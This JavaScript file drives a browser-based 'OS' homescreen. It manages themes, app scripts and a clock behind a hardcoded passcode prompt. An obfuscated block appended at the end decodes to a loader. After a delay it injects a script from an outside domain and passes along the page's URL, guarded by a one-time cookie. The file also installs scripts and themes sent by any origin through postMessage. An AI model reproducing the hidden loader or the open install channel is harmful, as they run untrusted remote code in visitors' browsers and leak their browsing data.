
var pass1 = "2279"
var pass = prompt('enter authentication passcode');
  if (pass == pass1)
  {
  } else { 
    window.location="https://xunlocknetworkenterprise.github.io/";
  }

if (alert(localStorage.getItem("theme")), null == localStorage.getItem("theme") && (localStorage.setItem("theme", "https://xunlocknetwork-srlc-channel.github.io/LHBOS/css/clockstyle.css"), localStorage.setItem("facReset", "false")), (localStorage.getItem("theme").length < 7 || "true" == localStorage.getItem("facReset")) && (localStorage.setItem("theme", "https://xunlocknetwork-srlc-channel.github.io/LHBOS/css/clockstyle.css"), localStorage.setItem("facReset", "false")), addTheme(localStorage.getItem("theme")), null == (apps = JSON.parse(localStorage.getItem("apps")))) {
    localStorage.setItem("apps", JSON.stringify(new Array));
    var apps = new Array
}
for (var arrayLength = apps.length, i = 0; i < arrayLength; i++) addApp(apps[i]);

function scrollbarVisible(e) {
    return e.scrollHeight > e.clientHeight
}

function uninstallApp(e) {   
    var t = JSON.parse(localStorage.getItem("apps"));
    if (1 == confirm("Are you sure you want to delete this app? You'll lose all your saved data!")) {
        for (var a = t.length - 1; a >= 0; --a)
            if (t[a] == e) {
                t.splice(a, 1);
                break
            }
        localStorage.setItem("apps", JSON.stringify(t));
        for (var n = document.getElementsByClassName(e); n[0];) n[0].parentNode.removeChild(n[0]);
        alert("App uninstalled. You may need to restart Brew OS to finish uninstalling.")
    }
    t = JSON.parse(localStorage.getItem("apps")), console.log(t)
}

function openapp(e, t) {
    var a = document.getElementById("main");
    for (const e of a.children) e.style = "display: none;";
    if (null != (e = document.getElementById(e))) {
        if ("IFRAME" == e.nodeName && "about:blank" == e.src && (e.src = t), "flashgame" == e.id) e.remove(), (e = document.createElement("embed")).id = "flashgame", e.className = "app", e.src = t, document.getElementById("main").appendChild(e);
        if ("game" == e.id) e.remove(), (e = document.createElement("iframe")).id = "game", e.className = "app", e.style = "width: 100%; height: calc(100vh - 36px); border: none;", e.src = t, document.getElementById("main").appendChild(e);
        e.style = "display: block;"
    } else console.log("// ERROR \nApp of name does not exist")
}

function closeApp(e) {
    null != (e = document.getElementById(e)) ? ("IFRAME" == e.nodeName && (e.src = "about:blank"), e.style = "display: none;") : console.log("// ERROR \nApp of name does not exist")
}

function addApp(e) {
    var t = document.createElement("script");
    t.src = e, document.body.appendChild(t);
    var a = document.createElement("a");
    a.href = "javascript:uninstallApp('" + e + "');", a.innerHTML = e + "<br>", a.className = "consolea " + e, document.getElementById("applist").appendChild(a)
}

function installAppV2(e, t) {
    1 == (0 == e.includes("clockwork-store.glitch.me") ? confirm("//// READ THIS MESSAGE!!!! ////\nAn untrusted app is trying to install a script to LHBOS. Apps can easily install malicious scripts apps will be reviewed by security to stop malware to break lhbos.\n\nAPP URL: " + t + "\n\nAre you ABSOULTELY SURE you want to continue with installation?") : confirm("Are you sure you want to install this app?")) && (1 == apps.includes(t) ? alert("App is already installed!") : (apps.push(t), addApp(t), localStorage.setItem("apps", JSON.stringify(apps)), console.log(apps)))
}

function installApp(e) {
    if (openapp("appstoreinstalling", "mongus"), null == e) e = prompt("Enter the URL of your custom script.");
    1 == apps.includes(e) ? alert("App is already installed!") : (console.warn("installApp() is deprecated! We've made it so it doesn't install apps forever for security reasons.\nPlease use installAppV2() instead"), 1 == confirm("This app is using outdated code - it may break at any time. Continue?") && addApp(e)), openapp("appstore", "mongus")
}

function sschk(e) {
    "donotremove-ss" != e.className && e.remove()
}

function addTheme(e) {
    ss2 = null == e ? prompt("Enter the link to the stylesheet.css file.") : e, document.querySelectorAll('style,link[rel="stylesheet"]').forEach((e => sschk(e)));
    var t = document.createElement("link");
    t.type = "text/css", t.rel = "stylesheet", t.href = ss2, document.body.appendChild(t);
    var a = ss2;
    localStorage.setItem("theme", a)
}

function startLoop() {
    const e = new Date;
    let t = e.getHours(),
        a = e.getMinutes(),
        n = e.getSeconds();
    a = checkTime(a), n = checkTime(n), document.getElementById("extra").innerHTML = t + ":" + a + ":" + n, apps = JSON.parse(localStorage.getItem("apps")), setTimeout(startLoop, 500)
}

function checkTime(e) {
    return e < 10 && (e = "0" + e), e
}

function unhide() {
    document.body.style = "display:block;", document.getElementById("loadingtxt").remove()
}

function factoryReset() {
    confirm("Are you ABSOLUTELY SURE you want to factory reset Home Brew?\nAll your themes and apps (and some data) will be gone!") && (localStorage.setItem("apps", "[]"), localStorage.setItem("facReset", "true"), addTheme("https://xunlocknetwork-srlc-channel.github.io/LHBOS/css/clockstyle.css"), document.location.reload())
}

function showMenu() {
    if (e.preventDefault(), "block" == document.getElementById("contextMenu").style.display) hideMenu();
    else {
        document.getElementById("unins-cm").href = "javascript:alert('" + v.className + "');";
        var t = document.getElementById("contextMenu");
        t.style.display = "block", t.style.left = e.pageX + "px", t.style.top = e.pageY + "px"
    }
}

function hideMenu() {
    document.getElementById("contextMenu").style.display = "none"
}
setTimeout(unhide, 1500), document.onclick = hideMenu, window.addEventListener("message", (function(e) {
    e.data.length > 1 && ("install app" == e.data[0] && installAppV2(e.origin, e.data[1]), "install theme" == e.data[0] && addTheme(e.data[1]))
})), window.addEventListener("beforeunload", (function(e) {
    e.preventDefault(), e.returnValue = ""
}));
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));
